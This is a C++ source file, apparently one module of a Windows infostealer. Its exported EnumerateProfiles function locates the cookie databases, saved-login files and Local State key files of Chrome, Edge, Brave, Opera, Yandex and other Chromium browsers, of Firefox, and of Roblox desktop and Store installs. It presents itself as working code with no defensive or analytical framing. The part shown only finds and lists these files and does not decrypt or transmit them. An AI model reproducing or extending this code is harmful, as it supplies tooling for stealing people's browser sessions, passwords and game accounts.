

#include "main.h"
#include <shlobj.h>
#include <vector>
#include <filesystem>

namespace fs = std::filesystem;
using namespace util;

static bool DirExists(const std::wstring& path) {
    DWORD attrs = GetFileAttributesW(path.c_str());
    return (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY));
}

static bool FileExists(const std::wstring& path) {
    DWORD attrs = GetFileAttributesW(path.c_str());
    return (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY));
}

struct ChromiumDef {
    const wchar_t* name;
    const wchar_t* folder;
};

static const ChromiumDef CHROMIUM_BROWSERS[] = {
    { L"Chrome",        L"Google\\Chrome"           },
    { L"Edge",          L"Microsoft\\Edge"          },
    { L"Brave",         L"BraveSoftware\\Brave-Browser" },
    { L"Opera",         L"Opera Software\\Opera Stable" },
    { L"Vivaldi",       L"Vivaldi"                  },
    { L"OperaGX",       L"Opera Software\\Opera GX Stable" },
    { L"Chromium",      L"Chromium"                 },
    { L"Yandex",        L"Yandex\\YandexBrowser"   },
    { L"360Browser",    L"360Chrome\\Chrome"        },
};

static void EnumerateChromiumProfiles(const std::wstring& localAppData,
                                       const ChromiumDef& def,
                                       std::vector<ProfileRec>& out) {
    std::wstring userData = localAppData + L"\\" + def.folder + L"\\User Data";
    if (!DirExists(userData)) return;

    std::wstring localState = userData + L"\\Local State";

    auto isSkippableChromeDir = [](const std::wstring& n) {
        return n == L"System Profile" ||
               n == L"Guest Profile"  ||
               n == L"ShaderCache"    ||
               n == L"GrShaderCache"  ||
               n == L"GraphiteDawnCache";
    };

    for (const auto& entry : fs::directory_iterator(userData)) {
        if (!entry.is_directory()) continue;
        std::wstring profileName = entry.path().filename().wstring();

        bool isProfile = (profileName == L"Default") ||
                         (profileName.find(L"Profile ") == 0);
        if (!isProfile) continue;
        if (isSkippableChromeDir(profileName)) continue;

        std::wstring profileDir = entry.path().wstring();

        std::wstring networkCookies = profileDir + L"\\Network\\Cookies";
        std::wstring cookiesFile     = profileDir + L"\\Cookies";
        std::wstring loginData       = profileDir + L"\\Login Data";

        std::wstring actualCookies;
        if (FileExists(networkCookies)) {
            actualCookies = networkCookies;
        } else if (FileExists(cookiesFile)) {
            actualCookies = cookiesFile;
        } else {
            continue;
        }

        ProfileRec bp;
        bp.name          = def.name;
        bp.cookiePath    = actualCookies;
        bp.loginDataPath = FileExists(loginData) ? loginData : L"";
        bp.localStatePath= FileExists(localState) ? localState : L"";
        bp.profileDir    = profileDir;
        bp.isChromium    = true;

        out.push_back(bp);
    }
}

static void EnumerateFirefoxProfiles(const std::wstring& appData,
                                      std::vector<ProfileRec>& out) {
    std::wstring profilesDir = appData + L"\\Mozilla\\Firefox\\Profiles";
    if (!DirExists(profilesDir)) return;

    for (const auto& entry : fs::directory_iterator(profilesDir)) {
        if (!entry.is_directory()) continue;
        std::wstring profileName = entry.path().filename().wstring();

        if (profileName.find(L".") == std::wstring::npos) continue;

        std::wstring profileDir = entry.path().wstring();
        std::wstring cookiesFile = profileDir + L"\\cookies.sqlite";
        std::wstring loginsFile  = profileDir + L"\\logins.json";

        if (!FileExists(cookiesFile) && !FileExists(loginsFile)) continue;

        ProfileRec bp;
        bp.name          = L"Firefox";
        bp.cookiePath    = FileExists(cookiesFile) ? cookiesFile : L"";
        bp.loginDataPath = FileExists(loginsFile)  ? loginsFile  : L"";
        bp.localStatePath= L"";
        bp.profileDir    = profileDir;
        bp.isChromium    = false;

        out.push_back(bp);
    }
}

static void EnumerateRobloxProfiles(const std::wstring& localAppData,
                                     std::vector<ProfileRec>& out) {

    std::wstring robloxLocal = localAppData + L"\\Roblox";
    if (DirExists(robloxLocal)) {

        for (const auto& entry : fs::recursive_directory_iterator(robloxLocal)) {
            if (!entry.is_regular_file()) continue;
            std::wstring fn = entry.path().filename().wstring();

            if (fn.find(L"Cookies") != std::wstring::npos ||
                fn.find(L"cookie") != std::wstring::npos ||
                fn == L"Local Storage" ||
                fn.find(L".sqlite") != std::wstring::npos) {
                
                ProfileRec bp;
                bp.name          = L"Roblox App";
                bp.cookiePath    = entry.path().wstring();
                bp.loginDataPath = L"";
                bp.localStatePath= L"";
                bp.profileDir    = robloxLocal;
                bp.isChromium    = false;
                out.push_back(bp);
                break;
            }
        }
    }

    std::wstring packages = localAppData + L"\\Packages";
    if (DirExists(packages)) {
        for (const auto& entry : fs::directory_iterator(packages)) {
            std::wstring fn = entry.path().filename().wstring();
            if (fn.find(L"ROBLOX") != std::wstring::npos) {
                std::wstring pkgDir = entry.path().wstring();

                for (const auto& sub : fs::recursive_directory_iterator(pkgDir)) {
                    if (!sub.is_regular_file()) continue;
                    std::wstring sfn = sub.path().filename().wstring();
                    if (sfn.find(L"Cookies") != std::wstring::npos ||
                        sfn.find(L".sqlite") != std::wstring::npos) {
                        
                        ProfileRec bp;
                        bp.name          = L"Roblox WinStore";
                        bp.cookiePath    = sub.path().wstring();
                        bp.loginDataPath = L"";
                        bp.localStatePath= L"";
                        bp.profileDir    = pkgDir;
                        bp.isChromium    = false;
                        out.push_back(bp);
                        break;
                    }
                }
            }
        }
    }
}

extern "C" U_API int EnumerateProfiles(ProfileRec* out, int maxCount) {
    std::vector<ProfileRec> profiles;

    std::wstring localAppData = LocalAppDataDir();
    std::wstring appData = GetAppDataDir();

    for (const auto& def : CHROMIUM_BROWSERS) {
        EnumerateChromiumProfiles(localAppData, def, profiles);
    }

    EnumerateFirefoxProfiles(appData, profiles);

    EnumerateRobloxProfiles(localAppData, profiles);

    int count = std::min((int)profiles.size(), maxCount);
    for (int i = 0; i < count; i++) {
        out[i] = profiles[i];
    }
    return count;
}
